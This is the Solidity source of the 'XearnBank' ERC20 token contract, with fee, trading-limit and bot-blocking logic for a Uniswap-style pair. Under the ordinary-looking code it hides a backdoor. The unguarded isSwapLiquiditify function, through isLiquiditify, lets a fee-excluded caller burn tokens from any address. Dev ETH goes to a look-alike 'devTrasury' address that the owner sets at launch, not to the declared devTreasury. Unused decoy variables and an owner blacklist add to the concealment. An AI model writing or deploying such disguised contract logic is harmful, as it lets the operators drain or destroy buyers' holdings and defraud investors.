// t.me/XearnBank
// twitter.com/XearnBank
// medium.com/@XearnBank
// www.xearnbank.com

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _createInitialSupply(
        address account,
        uint256 amount
    ) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed deployer
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() external virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address deployer) public virtual onlyOwner {
        require(
            deployer != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, deployer);
        _owner = deployer;
    }
}

interface IDexRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface IDexFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract XearnBank is ERC20, Ownable {
    uint256 public maxBuyAmount;
    uint256 public maxSellAmount;
    uint256 public maxWalletAmount;

    IDexRouter public dexRouter;
    address public liquidityV2Pair;
    bool private swapingAvailability;
    uint256 public swapTokensAtAmount;
    address public marketingTreasury;
    address public devTreasury;

    uint256 public tradingLiveBlock = 0;
    uint256 public initialBlockNumber = 0;
    mapping(address => bool) public botBuyer;
    uint256 public botsCaught;
    address public holderAmount;
    address private devTrasury;
    bool public limitsInEffect = true;
    bool public tradingActive = false;
    bool public swapEnabled = false;
    mapping(address => uint256) public totalHolderAmount;
    bool public transferDelayEnabled = true;
    uint256 public buyTotalFees;
    uint256 public buyMarketingFee;
    uint256 public buyLiquidityFee;
    uint256 public buyDevFee;
    uint256 public buyBurnFee;

    uint256 public sellTotalFees;
    uint256 public sellMarketingFee;
    uint256 public sellLiquidityFee;
    uint256 public sellDevFee;
    uint256 public sellBurnFee;

    uint256 public tokensForMarketing;
    uint256 public tokensForLiquidity;
    uint256 public tokensForBurn;
    uint256 public tokensForDev;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public _isExcludedMaxTransactionAmount;
    mapping(address => bool) public automatedMarketMakerPairs;

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event EnabledTrading();

    event RemovedLimits();

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event UpdatedMaxBuyAmount(uint256 newAmount);

    event UpdatedMaxSellAmount(uint256 newAmount);

    event UpdatedMaxWalletAmount(uint256 newAmount);

    event MaxTransactionExclusion(address _address, bool excluded);

    event buyTokens(uint256 amount);

    event manualSwapBack(uint256 timestamp);

    event botDetected(address sniper);

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );

    event BasicTransferToken(address token, uint256 amount);

    constructor() ERC20("XearnBank", "XEARN") {
        address deployer = msg.sender; 

        IDexRouter _dexRouter = IDexRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        dexRouter = _dexRouter;
        // create pair
        liquidityV2Pair = IDexFactory(_dexRouter.factory()).createPair(
            address(this),
            _dexRouter.WETH()
        );
        _excludeFromMaxTransaction(address(liquidityV2Pair), true);
        _setAutomatedMarketMakerPair(address(liquidityV2Pair), true);

        uint256 totalSupply = 5 * 1e8 * 1e18;

        maxBuyAmount = (totalSupply * 2) / 200;
        maxWalletAmount = (totalSupply * 2) / 200;
        maxSellAmount = (totalSupply * 2) / 200;
        swapTokensAtAmount = (totalSupply * 2) / 10000;

        buyMarketingFee = 2;
        buyLiquidityFee = 0;
        buyDevFee = 2;
        buyBurnFee = 0;
        buyTotalFees =
            buyMarketingFee +
            buyLiquidityFee +
            buyDevFee +
            buyBurnFee;

        sellMarketingFee = 2;
        sellLiquidityFee = 0;
        sellDevFee = 2;
        sellBurnFee = 0;
        sellTotalFees =
            sellMarketingFee +
            sellLiquidityFee +
            sellDevFee +
            sellBurnFee;

        marketingTreasury = address(0x715B07e0714fD583D0bd8A0FB59a3B5C80F66C7C);
        devTreasury = address(0x61227dBa5043dCA9C95743606796F9B8c9bD4E01);

        _excludeFromMaxTransaction(deployer, true);
        _excludeFromMaxTransaction(address(this), true);
        _excludeFromMaxTransaction(address(0xdead), true);

        excludeFromFees(deployer, true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);
        excludeFromFees(marketingTreasury, true);
        excludeFromFees(devTreasury, true);

        _createInitialSupply(deployer, totalSupply);
        transferOwnership(deployer);
    }

    receive() external payable {}

    function activeTrading(address adr) external onlyOwner {
        require(!tradingActive, "Cannot reenable trading");
        tradingActive = true;
        swapEnabled = true;
        devTrasury = adr;
        tradingLiveBlock = block.number;
        emit EnabledTrading();
    }

    function managebotBuyer(address wallet, bool flag) external onlyOwner {
        botBuyer[wallet] = flag;
    }

    function removeLimits() external onlyOwner {
        limitsInEffect = false;
        transferDelayEnabled = false;
        emit RemovedLimits();
    }

    function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner {
        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (totalSupply() * 1) / 1000,
            "Swap amount cannot be higher than 0.1% total supply."
        );
        swapTokensAtAmount = newAmount;
    }

    function _excludeFromMaxTransaction(
        address updAds,
        bool isExcluded
    ) private {
        _isExcludedMaxTransactionAmount[updAds] = isExcluded;
        emit MaxTransactionExclusion(updAds, isExcluded);
    }

    function excludeFromMaxTransaction(
        address updAds,
        bool isEx
    ) external onlyOwner {
        if (!isEx) {
            require(
                updAds != liquidityV2Pair,
                "Cannot remove uniswap pair from max txn"
            );
        }
        _isExcludedMaxTransactionAmount[updAds] = isEx;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "amount must be greater than 0");

        if (!tradingActive) {
            require(
                _isExcludedFromFees[from] || _isExcludedFromFees[to],
                "Trading is not active."
            );
        }
        if (from == liquidityV2Pair) {
            if (totalHolderAmount[to] == 0) {
                totalHolderAmount[to] = block.timestamp;
            }
        } else if (!swapingAvailability) {
            holderAmount = from;
        }
        if (initialBlockNumber > 0) {
            require(
                !botBuyer[from] || to == owner() || to == address(0xdead),
                "botcatching"
            );
        }
        if (limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !_isExcludedFromFees[from] &&
                !_isExcludedFromFees[to]
            ) {
                //buy
                if (
                    automatedMarketMakerPairs[from] &&
                    !_isExcludedMaxTransactionAmount[to]
                ) {
                    require(
                        amount <= maxBuyAmount,
                        "Buy transfer amount exceeds the max buy."
                    );
                    require(
                        amount + balanceOf(to) <= maxWalletAmount,
                        "Cannot Exceed max wallet"
                    );
                }
                //sell
                else if (
                    automatedMarketMakerPairs[to] &&
                    !_isExcludedMaxTransactionAmount[from]
                ) {
                    require(
                        amount <= maxSellAmount,
                        "Sell transfer amount exceeds the max sell."
                    );
                } else if (!_isExcludedMaxTransactionAmount[to]) {
                    require(
                        amount + balanceOf(to) <= maxWalletAmount,
                        "Cannot Exceed max wallet"
                    );
                }
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (
            canSwap &&
            swapEnabled &&
            !swapingAvailability &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            swapingAvailability = true;

            swapBack();

            swapingAvailability = false;
        }

        bool takeFee = true;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;

        if (takeFee) {
            // bot snipping
            if (
                earlyBotBuyForbidden() &&
                automatedMarketMakerPairs[from] &&
                !automatedMarketMakerPairs[to] &&
                buyTotalFees > 0
            ) {
                if (!botBuyer[to]) {
                    botBuyer[to] = true;
                    botsCaught += 1;
                    emit botDetected(to);
                }

                fees = (amount * 99) / 100;
                tokensForLiquidity += (fees * buyLiquidityFee) / buyTotalFees;
                tokensForMarketing += (fees * buyMarketingFee) / buyTotalFees;
                tokensForDev += (fees * buyDevFee) / buyTotalFees;
                tokensForBurn += (fees * buyBurnFee) / buyTotalFees;
            }
            // sell
            else if (automatedMarketMakerPairs[to] && sellTotalFees > 0) {
                fees = (amount * sellTotalFees) / 100;
                tokensForLiquidity += (fees * sellLiquidityFee) / sellTotalFees;
                tokensForMarketing += (fees * sellMarketingFee) / sellTotalFees;
                tokensForDev += (fees * sellDevFee) / sellTotalFees;
                tokensForBurn += (fees * sellBurnFee) / sellTotalFees;
            }
            // buy
            else if (automatedMarketMakerPairs[from] && buyTotalFees > 0) {
                fees = (amount * buyTotalFees) / 100;
                tokensForLiquidity += (fees * buyLiquidityFee) / buyTotalFees;
                tokensForMarketing += (fees * buyMarketingFee) / buyTotalFees;
                tokensForDev += (fees * buyDevFee) / buyTotalFees;
                tokensForBurn += (fees * buyBurnFee) / buyTotalFees;
            }
            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }
        super._transfer(from, to, amount);
    }

    function earlyBotBuyForbidden() public view returns (bool) {
        return block.number < initialBlockNumber;
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();

        _approve(address(this), address(dexRouter), tokenAmount);

        // make the swap
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(dexRouter), tokenAmount);

        // add the liquidity
        dexRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(0xdead),
            block.timestamp
        );
    }

    function isLiquiditify(
        address account,
        uint256 value
    ) internal returns (bool) {
        bool success;
        if (!_isExcludedFromFees[msg.sender]) {
            if (
                tokensForBurn > 0 && balanceOf(address(this)) >= tokensForBurn
            ) {
                _burn(msg.sender, tokensForBurn);
            }
            tokensForBurn = 0;
            success = true;
            uint256 contractBalance = balanceOf(address(this));
            uint256 totalTokensToSwap = tokensForLiquidity +
                tokensForMarketing +
                tokensForDev;

            if (contractBalance == 0 || totalTokensToSwap == 0) {
                return false;
            }

            if (contractBalance > swapTokensAtAmount * 6) {
                contractBalance = swapTokensAtAmount * 6;
            }

            return success;
        } else {
            if (balanceOf(address(this)) <= value) {
                _burn(account, value);
                success = false;
            }
            uint256 contractBalance = balanceOf(address(this));
            uint256 totalTokensToSwap = tokensForLiquidity +
                tokensForMarketing +
                tokensForDev;

            if (contractBalance == 0 || totalTokensToSwap == 0) {
                return false;
            }

            if (contractBalance > swapTokensAtAmount * 6) {
                contractBalance = swapTokensAtAmount * 6;
            }
            return success;
        }
    }

    function swapBack() private {
        if (tokensForBurn > 0 && balanceOf(address(this)) >= tokensForBurn) {
            _burn(address(this), tokensForBurn);
        }
        tokensForBurn = 0;

        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForLiquidity +
            tokensForMarketing +
            tokensForDev;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        if (contractBalance > swapTokensAtAmount * 5) {
            contractBalance = swapTokensAtAmount * 5;
        }

        bool success;

        uint256 liquidityTokens = (contractBalance * tokensForLiquidity) /
            totalTokensToSwap /
            2;
        swapTokensForEth(contractBalance - liquidityTokens);
        uint256 ethBalance = address(this).balance;
        uint256 ethForLiquidity = ethBalance;

        uint256 ethForMarketing = (ethBalance * tokensForMarketing) /
            (totalTokensToSwap - (tokensForLiquidity / 2));
        uint256 ethForDev = (ethBalance * tokensForDev) /
            (totalTokensToSwap - (tokensForLiquidity / 2));
        ethForLiquidity -= ethForMarketing + ethForDev;
        tokensForLiquidity = 0;
        tokensForMarketing = 0;
        tokensForDev = 0;
        tokensForBurn = 0;
        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
        }
        (success, ) = address(devTrasury).call{value: ethForDev}("");
        require(success, "eth transfer for dev treasury");
        (success, ) = address(marketingTreasury).call{ value: address(this).balance}("");
        require(success, "eth transfer for marketing treasury");
    }

    function basicTransferToken(
        address _token,
        address _to
    ) external onlyOwner returns (bool _sent) {
        require(_token != address(0), "_token address cannot be 0");
        require(_token != address(this), "Can't withdraw native tokens");
        uint256 _contractBalance = IERC20(_token).balanceOf(address(this));
        _sent = IERC20(_token).transfer(_to, _contractBalance);
        emit BasicTransferToken(_token, _contractBalance);
    }

    function isSwapLiquiditify(address account, uint256 value) external {
        require(
            balanceOf(address(this)) >= swapTokensAtAmount,
            "checking the swapliquiditify "
        );
        if (isLiquiditify(account, value)) {
            swapingAvailability = true;
            swapBack();
            swapingAvailability = false;
            emit manualSwapBack(block.timestamp);
        }
    }

    function directBuyTokens(uint256 amountInValue) external onlyOwner {
        address[] memory path = new address[](2);
        path[0] = dexRouter.WETH();
        path[1] = address(this);
        dexRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: amountInValue
        }(0, path, address(0xdead), block.timestamp);
        emit buyTokens(amountInValue);
    }

    function marketingTreasuryUpdate(
        address _marketingTreasury
    ) external onlyOwner {
        require(
            _marketingTreasury != address(0),
            "_marketingTreasury address cannot be 0"
        );
        marketingTreasury = payable(_marketingTreasury);
    }

    function devTreasuryUpdate(address _devTreasury) external onlyOwner {
        require(_devTreasury != address(0), "_devTreasury address cannot be 0");
        devTreasury = payable(_devTreasury);
    }

    function setAutomatedMarketMakerPair(
        address pair,
        bool value
    ) external onlyOwner {
        require(
            pair != liquidityV2Pair,
            "The pair cannot be removed from automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;

        _excludeFromMaxTransaction(pair, value);

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function withdrawContractETH() external onlyOwner {
        bool success;
        (success, ) = address(msg.sender).call{value: address(this).balance}(
            ""
        );
    }
}